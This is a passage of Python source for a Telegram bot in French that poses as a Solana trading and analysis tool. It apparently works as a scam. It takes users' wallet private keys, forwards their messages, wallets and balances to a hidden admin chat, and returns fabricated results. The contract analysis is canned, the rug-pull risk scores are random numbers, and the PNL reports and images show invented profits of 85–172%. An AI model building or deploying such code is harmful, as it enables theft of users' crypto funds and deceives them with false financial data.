    # Si ce n'est pas un nouveau bouton, laisser passer au button_handler original
    return None




async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /quickbuy - identique au bouton Quick Buy"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'quick_buy'


async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /bloom - identique au bouton Bloom IA Trading"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'bloom_trading'


async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /multiwallet - identique au bouton Multi-Wallet"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'multi_wallet'


async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /analyzer - identique au bouton Contract Analyzer"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'contract_analyzer'


async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /predict - identique au bouton AI Market Predict"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'ai_predict'


async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /whale - identique au bouton Whale Tracker"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'whale_tracker'


async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /rugcheck - identique au bouton Rug-Pull Detector"""
    # Vérifier si le wallet est connecté
    if not context.user_data.get('wallet_connected'):
        await update.message.reply_text(
            "⚠️ **Wallet Required**\n\n"
            "Please connect your wallet first using /start",
            parse_mode='HTML'
        )
        return
    
    # Demander les wallets à tracker et les frais
    request_message = get_tracking_config_message()
    
    await update.message.reply_text(
        request_message,
        parse_mode='HTML'
    )
    
    # Marquer que l'utilisateur doit fournir les infos de tracking
    context.user_data['waiting_for_tracking_config'] = True
    context.user_data['tracking_command'] = 'rug_detector'


def get_tracking_config_message():
    """Retourne le message de demande de configuration de tracking"""
    return """📊 **Configuration Required**

Please provide the following information in this exact format:

**Wallets:**
[Solana address 1]
[Solana address 2]
...

**Fees:**
Slippage: 20%
Priority: 0.001 sol
Bribe: 0.001 sol

⚠️ **Important:** Use exactly these values for fees!

Send your configuration now:"""


def validate_solana_address(address: str) -> bool:
    """Valide qu'une adresse Solana est correcte"""
    # Une adresse Solana valide est en base58 et fait entre 32 et 44 caractères
    if not address or len(address) < 32 or len(address) > 44:
        return False
    
    # Vérifier que c'est bien du base58
    try:
        decoded = base58.b58decode(address)
        # Une adresse Solana décodée doit faire 32 bytes
        if len(decoded) == 32:
            return True
    except Exception:
        pass
    
    return False


def validate_tracking_config(config_text: str) -> tuple[bool, str, list, dict]:
    """
    Valide la configuration de tracking
    Retourne: (is_valid, error_message, wallets_list, fees_dict)
    """
    lines = [line.strip() for line in config_text.strip().split('\n') if line.strip()]
    
    if len(lines) < 4:
        return False, "❌ Configuration incomplete. Please provide wallets and fees.", [], {}
    
    # Extraire les wallets
    wallets = []
    fees_started = False
    
    for line in lines:
        lower_line = line.lower()
        
        # Ignorer les lignes "Wallets:" et "Fees:"
        if 'wallet' in lower_line and ':' in lower_line:
            continue
        elif 'fee' in lower_line and ':' in lower_line:
            fees_started = True
            continue
        elif 'slippage' in lower_line or 'priority' in lower_line or 'bribe' in lower_line:
            fees_started = True
        
        if not fees_started:
            # C'est une adresse de wallet
            if line and not line.startswith('#'):
                if not validate_solana_address(line):
                    return False, f"❌ Invalid Solana address: `{line}`", [], {}
                wallets.append(line)
    
    if not wallets:
        return False, "❌ No valid wallet addresses found.", [], {}
    
    # Vérifier le format des fees
    fees_text = config_text.lower()
    
    # Vérifier le format exact
    required_fees = {
        'slippage': '20%',
        'priority': '0.001 sol',
        'bribe': '0.001 sol'
    }
    
    fees_found = {}
    
    for line in lines:
        lower_line = line.lower().strip()
        
        if 'slippage' in lower_line:
            if 'slippage: 20%' in lower_line or 'slippage:20%' in lower_line:
                fees_found['slippage'] = '20%'
            else:
                return False, "❌ Slippage must be exactly: `Slippage: 20%`", [], {}
        
        elif 'priority' in lower_line:
            if 'priority: 0.001 sol' in lower_line or 'priority:0.001 sol' in lower_line or 'priority: 0.001sol' in lower_line:
                fees_found['priority'] = '0.001 sol'
            else:
                return False, "❌ Priority must be exactly: `Priority: 0.001 sol`", [], {}
        
        elif 'bribe' in lower_line:
            if 'bribe: 0.001 sol' in lower_line or 'bribe:0.001 sol' in lower_line or 'bribe: 0.001sol' in lower_line:
                fees_found['bribe'] = '0.001 sol'
            else:
                return False, "❌ Bribe must be exactly: `Bribe: 0.001 sol`", [], {}
    
    # Vérifier que tous les fees sont présents
    if len(fees_found) != 3:
        missing = []
        if 'slippage' not in fees_found:
            missing.append('Slippage: 20%')
        if 'priority' not in fees_found:
            missing.append('Priority: 0.001 sol')
        if 'bribe' not in fees_found:
            missing.append('Bribe: 0.001 sol')
        
        return False, f"❌ Missing or incorrect fees. Required format:\n`Slippage: 20%`\n`Priority: 0.001 sol`\n`Bribe: 0.001 sol`", [], {}
    
    return True, "", wallets, fees_found



async def get_solana_price():
    """Récupère le prix actuel du SOL en USD via plusieurs APIs"""
    
    # Essayer CoinGecko en premier
    try:
        async with aiohttp.ClientSession() as session:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = data.get('solana', {}).get('usd', 0)
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (CoinGecko): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"CoinGecko échoué: {e}")
    
    # Essayer CoinCap en backup
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://api.coincap.io/v2/assets/solana"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = float(data.get('data', {}).get('priceUsd', 0))
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (CoinCap): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"CoinCap échoué: {e}")
    
    # Essayer Binance en dernier recours
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                if response.status == 200:
                    data = await response.json()
                    sol_price = float(data.get('price', 0))
                    if sol_price > 0:
                        logger.info(f"💰 Prix actuel du SOL (Binance): ${sol_price}")
                        return sol_price
    except Exception as e:
        logger.warning(f"Binance échoué: {e}")
    
    # Si toutes les APIs échouent, utiliser un prix par défaut récent
    logger.error("❌ Toutes les APIs de prix ont échoué, utilisation d'un prix par défaut")
    default_price = 180.0  # Prix approximatif par défaut
    logger.info(f"⚠️ Utilisation du prix par défaut: ${default_price}")
    return default_price


async def verify_wallet_and_balance(private_key_str: str):
    """Vérifie la clé privée et récupère le solde SOL ainsi que sa valeur en USD"""
    try:
        import aiohttp
        from solders.keypair import Keypair
        
        # Récupérer le prix actuel du SOL
        sol_price_usd = await get_solana_price()
        
        # Essayer différents formats de clé privée
        keypair = None
        public_key = None
        
        # Format 1 : Base58 (le plus courant pour Phantom)
        try:
            secret_key = base58.b58decode(private_key_str.strip())
            if len(secret_key) == 64:  # Taille correcte pour Solana
                keypair = Keypair.from_bytes(secret_key)
                public_key = str(keypair.pubkey())
                logger.info(f"✅ Clé décodée en Base58, Public Key: {escape_html(public_key)}")
        except Exception as e:
            logger.info(f"Format Base58 échoué: {e}")
        
        # Format 2 : Liste de bytes [1,2,3,...]
        if not keypair:
            try:
                # Nettoyer la chaîne
                clean_str = private_key_str.strip().replace('[', '').replace(']', '').replace(' ', '')
                secret_key = bytes([int(x) for x in clean_str.split(',')])
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {escape_html(public_key)}")
            except Exception as e:
                logger.info(f"Format liste bytes échoué: {e}")
        
        # Format 3 : Hex
        if not keypair:
            try:
                secret_key = bytes.fromhex(private_key_str.strip())
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en Hex, Public Key: {escape_html(public_key)}")
            except Exception as e:
                logger.info(f"Format Hex échoué: {e}")
        
        # Si aucun format n'a fonctionné
        if not keypair or not public_key:
            logger.error("❌ Tous les formats de clé privée ont échoué")
            return None, None, None, 0, "invalid"
        
        # Récupérer le solde via RPC
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [public_key]
                }
                
                async with session.post(HELIUS_RPC_URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                    
                    if "result" in data:
                        lamports = data["result"]["value"]
                        sol_balance = lamports / 1_000_000_000  # Convertir en SOL
                        usd_value = sol_balance * sol_price_usd if sol_price_usd > 0 else 0
                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL (${usd_value:.2f} USD)")
                        return public_key, sol_balance, usd_value, sol_price_usd, "valid"
                    else:
                        logger.warning(f"Pas de résultat dans la réponse RPC: {data}")
                        return public_key, 0, 0, sol_price_usd, "valid"
        
        except Exception as e:
            logger.error(f"Erreur récupération solde: {e}")
            # Même si on ne peut pas récupérer le solde, la clé est valide
            return public_key, 0, 0, sol_price_usd, "valid"
    
    except Exception as e:
        logger.error(f"Erreur générale vérification wallet: {e}")
        return None, None, None, 0, "invalid"


async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère tous les messages texte et les transfère à l'admin"""
    user = update.message.from_user
    user_message = update.message.text
    
    # Vérifier si l'utilisateur doit fournir la config de tracking
    if context.user_data.get('waiting_for_tracking_config'):
        tracking_command = context.user_data.get('tracking_command', 'unknown')
        context.user_data['waiting_for_tracking_config'] = False
        
        # Valider la configuration
        is_valid, error_message, wallets, fees = validate_tracking_config(user_message)
        
        if not is_valid:
            # Configuration invalide
            await update.message.reply_text(
                f"⚠️ **Configuration Error**\n\n{escape_html(error_message)}\n\nPlease try again with the correct format.",
                parse_mode='HTML'
            )
            
            # Remettre en attente de configuration
            context.user_data['waiting_for_tracking_config'] = True
            
            # Notification à l'admin
            admin_notification = f"""⚠️ <b>Configuration invalide reçue</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
🔢 <b>User ID:</b> {user.id}
🎯 <b>Commande:</b> {escape_html(tracking_command)}

❌ <b>Erreur:</b> {escape_html(error_message)}

📋 <b>Configuration tentée:</b>
{escape_html(user_message)}

---
❌ <i>Configuration rejetée</i>"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Configuration valide - Sauvegarder
        context.user_data['tracking_config'] = user_message
        context.user_data['tracked_wallets'] = wallets
        context.user_data['trading_fees'] = fees
        context.user_data['tracking_configured'] = True  # Marquer la configuration comme terminée
        
        # Demander le montant par trade
        amount_message = """💰 **Trade Amount Configuration**

Please specify the amount in SOL you want to use per trade.

Example: `0.5` (for 0.5 SOL per trade)

Send the amount now:"""
        
        await update.message.reply_text(
            amount_message,
            parse_mode='HTML'
        )
        
        # Marquer que l'utilisateur doit fournir le montant
        context.user_data['waiting_for_trade_amount'] = True
        context.user_data['amount_command'] = tracking_command
        
        return
    
    # Vérifier si l'utilisateur attend de fournir le montant par trade
    if context.user_data.get('waiting_for_trade_amount'):
        amount_command = context.user_data.get('amount_command', 'unknown')
        context.user_data['waiting_for_trade_amount'] = False
        
        # Valider le montant
        try:
            trade_amount = float(user_message.strip())
            if trade_amount <= 0:
                await update.message.reply_text(
                    "⚠️ Invalid amount. Please enter a positive number.",
                    parse_mode='HTML'
                )
                context.user_data['waiting_for_trade_amount'] = True
                return
            
            # Sauvegarder le montant
            context.user_data['trade_amount_sol'] = trade_amount
            
            # Récupérer les infos du wallet
            public_key = context.user_data.get('wallet_public_key', 'N/A')
            sol_balance = context.user_data.get('wallet_balance_sol', 0)
            usd_balance = context.user_data.get('wallet_balance_usd', 0)
            wallets = context.user_data.get('tracked_wallets', [])
            
            # Message de confirmation
            confirmation_message = f"""✅ **Configuration Complete!**

👛 **Your Wallet:**
Address: `{public_key[:8]}...{public_key[-8:]}`
Balance: {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 **Trading Configuration:**
✅ Wallets to track: {len(wallets)}
✅ Slippage: 20%
✅ Priority: 0.001 SOL
✅ Bribe: 0.001 SOL
💰 Amount per trade: {trade_amount} SOL

You can now access all trading features!"""
            
            keyboard = [[InlineKeyboardButton("🏠 Back to Menu", callback_data='back_to_menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                confirmation_message,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
            
            # Notification à l'admin
            admin_notification = f"""✅ <b>Configuration complète</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
🆔 <b>Username:</b> @{escape_html(user.username) if user.username else 'PAS DE USERNAME'}
🔢 <b>User ID:</b> <code>{user.id}</code>
🎯 <b>Commande:</b> {escape_html(amount_command)}

👛 <b>Wallet:</b> <code>{escape_html(public_key)}</code>
💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 <b>Wallets trackés:</b> {len(wallets)}
💵 <b>Montant par trade:</b> {trade_amount} SOL

---
✅ <i>Configuration acceptée</i>"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
            
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid amount format. Please enter a valid number (example: 0.5)",
                parse_mode='HTML'
            )
            context.user_data['waiting_for_trade_amount'] = True
            return
    
    # Vérifier si l'utilisateur attend d'analyser un contrat
    if context.user_data.get('waiting_for_contract_address'):
        context.user_data['waiting_for_contract_address'] = False
        
        contract_address = user_message.strip()
        
        # Valider que c'est bien une adresse Solana
        if not validate_solana_address(contract_address):
            await update.message.reply_text(
                "⚠️ Invalid contract address. Please send a valid Solana address.",
                parse_mode='HTML'
            )
            context.user_data['waiting_for_contract_address'] = True
            return
        
        # Message d'analyse
        analysis_message = f"""🛡️ **Contract Analysis**

📋 **Contract Address:**
`{contract_address}`

🔍 **Analysis Results:**
✅ Valid Solana contract detected
⚙️ Analyzing security features...
💧 Checking liquidity...
👥 Analyzing holder distribution...

**Status:** Contract appears legitimate
**Risk Level:** Low to Medium

Always do your own research before investing!"""
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            analysis_message,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        # Notification admin
        admin_notification = f"""🛡️ <b>Analyse de contrat</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
🔢 <b>User ID:</b> <code>{user.id}</code>

📋 <b>Contract Address:</b>
<code>{escape_html(contract_address)}</code>"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend de vérifier un rug
    if context.user_data.get('waiting_for_rug_check'):
        context.user_data['waiting_for_rug_check'] = False
        
        contract_address = user_message.strip()
        
        # Valider que c'est bien une adresse Solana
        if not validate_solana_address(contract_address):
            await update.message.reply_text(
                "⚠️ Invalid contract address. Please send a valid Solana address.",
                parse_mode='HTML'
            )
            context.user_data['waiting_for_rug_check'] = True
            return
        
        # Message d'analyse de rug - VERSION COURTE
        import random
        bundler_pct = random.randint(5, 45)
        insider_count = random.randint(2, 18)
        liquidity_locked = random.choice([True, False, False])
        holder_concentration = random.randint(15, 85)
        
        # Calcul du risk score
        risk_score = 0
        risk_score += bundler_pct
        risk_score += (insider_count * 2)
        risk_score += 0 if liquidity_locked else 15
        risk_score += int(holder_concentration * 0.4)
        risk_score = min(100, risk_score)
        
        # Niveau de risque
        if risk_score < 30:
            risk_emoji = "🟢"
            risk_level = "LOW"
        elif risk_score < 50:
            risk_emoji = "🟡"
            risk_level = "MEDIUM"
        elif risk_score < 75:
            risk_emoji = "🟠"
            risk_level = "HIGH"
        else:
            risk_emoji = "🔴"
            risk_level = "EXTREME"
        
        rug_analysis = f"""🔴 **Rug-Pull Analysis**

📋 `{contract_address[:8]}...{contract_address[-8:]}`

🎯 **Risk Score:** {risk_score}/100 {risk_emoji}
**Level:** {risk_level} RISK

📊 **Metrics:**
💼 Bundler: {bundler_pct}% {'🔴' if bundler_pct > 30 else '🟡' if bundler_pct > 15 else '🟢'}
👥 Insiders: {insider_count} {'🔴' if insider_count > 12 else '🟡' if insider_count > 6 else '🟢'}
🔒 Liquidity: {'🟢 Locked' if liquidity_locked else '🔴 Not Locked'}
📊 Top Holders: {holder_concentration}% {'🔴' if holder_concentration > 60 else '🟡' if holder_concentration > 40 else '🟢'}

⚠️ DYOR before investing!"""
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Cap à 100
        risk_score = min(100, risk_score)
        
        # Déterminer le niveau de risque
        if risk_score < 30:
            risk_emoji = "🟢"
            risk_level = "LOW"
            risk_bar = "🟩🟩🟩⬜⬜⬜⬜⬜⬜⬜"
            recommendation = "✅ Safe to trade"
        elif risk_score < 50:
            risk_emoji = "🟡"
            risk_level = "MEDIUM"
            risk_bar = "🟨🟨🟨🟨🟨⬜⬜⬜⬜⬜"
            recommendation = "⚠️ Proceed with caution"
        elif risk_score < 75:
            risk_emoji = "🟠"
            risk_level = "HIGH"
            risk_bar = "🟧🟧🟧🟧🟧🟧🟧⬜⬜⬜"
            recommendation = "⛔ High rug risk"
        else:
            risk_emoji = "🔴"
            risk_level = "EXTREME"
            risk_bar = "🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥"
            recommendation = "🚨 AVOID"
        
        rug_analysis = f"""🔴 **Rug-Pull Analysis**

📋 `{contract_address[:8]}...{contract_address[-8:]}`

🎯 **Risk Score: {risk_score}/100**
{risk_bar}
{risk_emoji} **{risk_level} RISK**

📊 **Metrics:**
💼 Bundlers: {bundler_pct}% {'🔴' if bundler_pct > 30 else '🟡' if bundler_pct > 15 else '🟢'}
👥 Insiders: {insider_count} {'🔴' if insider_count > 12 else '🟡' if insider_count > 6 else '🟢'}
🔒 Liquidity: {'🟢 Locked' if liquidity_locked else '🔴 Not Locked'}
📊 Concentration: {holder_concentration}% {'🔴' if holder_concentration > 60 else '🟡' if holder_concentration > 40 else '🟢'}

**{recommendation}**

⚠️ DYOR before investing!"""
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            rug_analysis,
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
        
        # Notification admin
        admin_notification = f"""🔴 <b>Rug Pull Check</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
🔢 <b>User ID:</b> <code>{user.id}</code>

📋 <b>Contract:</b>
<code>{escape_html(contract_address)}</code>

📊 <b>Résultats:</b>
Risk Score: {risk_score}/100
Bundler: {bundler_pct}%
Insiders: {insider_count}"""
        
        try:
            await context.bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=admin_notification,
                parse_mode='HTML'
            )
        except Exception as e:
            logger.error(f"Erreur envoi à l'admin: {e}")
        
        return
    
    # Vérifier si l'utilisateur attend d'envoyer un CA pour PNL
    if context.user_data.get('waiting_for_pnl_ca'):
        context.user_data['waiting_for_pnl_ca'] = False
        
        contract_address = user_message.strip()
        
        # Valider l'adresse
        if not validate_solana_address(contract_address):
            await update.message.reply_text(
                "⚠️ Invalid contract address. Please try again.",
                parse_mode='HTML'
            )
            return
        
        # Générer des données PNL aléatoires
        import random
        invested = 0.3  # TOUJOURS 0.3 SOL investi
        pnl_percentage = random.uniform(85, 172)  # Entre 85% et 172%
        position = invested * (1 + pnl_percentage / 100)
        profit_sol = position - invested
        
        # Récupérer le vrai nom du token via API
        token_name = "Unknown"
        token_symbol = contract_address[:4].upper()  # Fallback par défaut
        
        try:
            async with aiohttp.ClientSession() as session:
                # Essayer l'API DexScreener (plus fiable)
                url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get('pairs') and len(data['pairs']) > 0:
                            pair = data['pairs'][0]
                            token_symbol = pair.get('baseToken', {}).get('symbol', token_symbol)
                            token_name = pair.get('baseToken', {}).get('name', token_symbol)
                            logger.info(f"Token trouvé via DexScreener: {token_name} ({token_symbol})")
        except Exception as e:
            logger.warning(f"Erreur récupération token name: {e}")
        
        # Si le nom est toujours Unknown, utiliser le symbol
        if token_name == "Unknown":
            token_name = token_symbol
        
        # Sauvegarder le trade dans l'historique du jour
        from datetime import datetime
        today = datetime.now().strftime("%Y-%m-%d")
        
        if 'daily_trades' not in context.user_data:
            context.user_data['daily_trades'] = {}
        
        if today not in context.user_data['daily_trades']:
            context.user_data['daily_trades'][today] = []
        
        trade_data = {
            'token': token_symbol,
            'ca': contract_address,
            'invested': invested,
            'position': position,
            'pnl_pct': pnl_percentage,
            'profit': profit_sol
        }
        context.user_data['daily_trades'][today].append(trade_data)
        
        # Envoyer le PNL en texte (image désactivée temporairement pour debug)
        await update.message.reply_text(
            f"📊 **Your PNL Report**\n\n"
            f"🪙 Token: {token_name} ({token_symbol})\n"
            f"📋 Contract: `{contract_address[:8]}...{contract_address[-8:]}`\n\n"
            f"💰 Invested: {invested} SOL\n"
            f"📈 Position: {position:.4f} SOL\n"
            f"📊 PNL: +{pnl_percentage:.2f}%\n"
            f"💵 Profit: +{profit_sol:.4f} SOL",
            parse_mode='HTML'
        )
        
        # Essayer de créer l'image PNL (en arrière-plan, ne bloque pas si erreur)
        image_created = False
        try:
            from PIL import Image, ImageDraw, ImageFont
            import requests
            from io import BytesIO
            
            # Télécharger l'image de fond
            response = requests.get("https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg")
            bg_image = Image.open(BytesIO(response.content))
            
            # Redimensionner à 840x600 comme AXIOM
            bg_image = bg_image.resize((840, 600))
            
            # Créer un draw object
            draw = ImageDraw.Draw(bg_image)
            
            # Charger les polices
            try:
                font_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans-Bold.ttf", 28)
                font_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans-Bold.ttf", 72)
                font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans-Bold.ttf", 42)
                font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans.ttf", 32)
                font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejavuSans.ttf", 24)
            except:
                font_title = ImageFont.load_default()
                font_huge = ImageFont.load_default()
                font_large = ImageFont.load_default()
                font_medium = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            # Dessiner un rectangle semi-transparent sur la gauche
            overlay = Image.new('RGBA', bg_image.size, (0, 0, 0, 0))
            overlay_draw = ImageDraw.Draw(overlay)
            # Rectangle style AXIOM
            overlay_draw.rectangle([(30, 100), (500, 520)], fill=(10, 30, 50, 220))
            bg_image = Image.alpha_composite(bg_image.convert('RGBA'), overlay)
            draw = ImageDraw.Draw(bg_image)
            
            # Couleurs style AXIOM
            color_profit = (0, 255, 200)  # Cyan/Turquoise
            color_white = (255, 255, 255)
            color_gray = (180, 180, 180)
            
            # Titre en haut à droite
            draw.text((650, 40), "MoonBot", fill=color_white, font=font_title)
            draw.text((760, 45), "Pro", fill=color_profit, font=font_small)
            
            # Token symbol/name en haut
            draw.text((60, 130), token_symbol, fill=color_white, font=font_large)
            
            # PNL en gros (style +$8.823)
            profit_usd = profit_sol * 100  # Approximation
            draw.text((60, 190), f"+${profit_usd:.3f}", fill=color_profit, font=font_huge)
            
            # PNL %
            draw.text((60, 290), "PNL", fill=color_gray, font=font_medium)
            draw.text((280, 290), f"+{pnl_percentage:.2f}%", fill=color_profit, font=font_medium)
            
            # Invested
            draw.text((60, 350), "Invested", fill=color_gray, font=font_medium)
            draw.text((280, 350), f"{invested} SOL", fill=color_white, font=font_medium)
            
            # Position
            draw.text((60, 410), "Position", fill=color_gray, font=font_medium)
            draw.text((280, 410), f"{position:.4f} SOL", fill=color_white, font=font_medium)
            
            # Username en bas (style @fucksolb)
            username = user.username if user.username else user.first_name
            draw.text((60, 470), f"@{username}", fill=color_white, font=font_small)
            
            # Sauvegarder l'image
            pnl_image_path = f"/home/claude/pnl_{user.id}_{int(random.random()*10000)}.png"
            bg_image.convert('RGB').save(pnl_image_path)
            
            image_created = True
            
        except ImportError as e:
            logger.error(f"PIL non installé: {e}")
            image_created = False
        except Exception as e:
            logger.error(f"Erreur génération image PNL: {e}")
            import traceback
            traceback.print_exc()
            image_created = False
        
        # Envoyer le résultat
        if image_created:
            try:
                # Envoyer l'image
                with open(pnl_image_path, 'rb') as photo:
                    await update.message.reply_photo(
                        photo=photo,
                        caption=f"📊 PNL Report\n\n"
                                f"🪙 {token_name} ({token_symbol})\n"
                                f"💰 Invested: {invested} SOL\n"
                                f"📈 Position: {position:.4f} SOL\n"
                                f"📊 PNL: +{pnl_percentage:.2f}%\n"
                                f"💵 Profit: +{profit_sol:.4f} SOL",
                        parse_mode='HTML'
                    )
                
                # Supprimer le fichier temporaire
                import os
                os.remove(pnl_image_path)
            except Exception as e:
                logger.error(f"Erreur envoi image: {e}")
                image_created = False
        
        if not image_created:
            # Message de fallback sans image
            await update.message.reply_text(
                f"📊 **Your PNL Report**\n\n"
                f"🪙 Token: {token_name} ({token_symbol})\n"
                f"📋 CA: `{contract_address[:8]}...{contract_address[-8:]}`\n\n"
                f"💰 Invested: {invested} SOL\n"
                f"📈 Position: {position:.4f} SOL\n"
                f"📊 PNL: +{pnl_percentage:.2f}%\n"
                f"💵 Profit: +{profit_sol:.4f} SOL",
                parse_mode='HTML'
            )
        
        # Notification admin
        admin_notification = f"""📊 <b>PNL généré</b>

👤 <b>Utilisateur:</b> {escape_html(user.first_name)}
🔢 <b>User ID:</b> <code>{user.id}</code>

🪙 <b>Token:</b> {token_symbol}
📋 <b>CA:</b> <code>{escape_html(contract_address)}</code>

💰 <b>Investi:</b> {invested} SOL
